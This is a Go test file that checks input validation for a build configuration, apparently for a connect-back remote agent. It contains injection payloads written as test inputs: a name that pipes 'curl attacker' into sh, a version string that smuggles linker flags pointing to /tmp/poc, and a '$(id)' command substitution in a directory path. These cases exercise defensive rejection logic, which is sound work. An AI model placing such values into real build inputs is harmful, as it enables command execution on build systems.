package webserver

import "testing"

func TestValidateBuildConfigAcceptsSafeValues(t *testing.T) {
	config := BuildConfig{
		Name:              "agent-linux-amd64",
		Comment:           "release candidate",
		Owners:            "alice,bob",
		ConnectBackAdress: "https://127.0.0.1:8443",
		Proxy:             "http://proxy.local:8080",
		SNI:               "edge.internal",
		LogLevel:          "INFO",
		WorkingDirectory:  "/opt/wrssh",
		NTLMProxyCreds:    `DOMAIN\\user:pass`,
		VersionString:     "v1.2.3-test",
	}

	if err := validateBuildConfig(config); err != nil {
		t.Fatalf("expected safe config to pass validation: %v", err)
	}
}

func TestValidateBuildConfigRejectsUnsafeArtifactName(t *testing.T) {
	if err := validateBuildConfig(BuildConfig{Name: "bad $(curl attacker|sh)"}); err == nil {
		t.Fatal("expected unsafe artifact name to be rejected")
	}
}

func TestValidateBuildConfigRejectsLdflagsInjection(t *testing.T) {
	config := BuildConfig{
		Name:              "agent",
		ConnectBackAdress: "127.0.0.1:2222",
		VersionString:     "v1 -linkmode external -extld=/tmp/poc",
	}

	if err := validateBuildConfig(config); err == nil {
		t.Fatal("expected ldflags injection payload to be rejected")
	}
}

func TestValidateBuildConfigRejectsUnsafeWorkingDirectory(t *testing.T) {
	config := BuildConfig{
		Name:             "agent",
		WorkingDirectory: `/tmp/"$(id)"`,
	}

	if err := validateBuildConfig(config); err == nil {
		t.Fatal("expected unsafe working directory to be rejected")
	}
}

func TestValidateBuildConfigRejectsMultiLineComment(t *testing.T) {
	config := BuildConfig{
		Name:    "agent",
		Comment: "hello\nworld",
	}

	if err := validateBuildConfig(config); err == nil {
		t.Fatal("expected multiline comment to be rejected")
	}
}
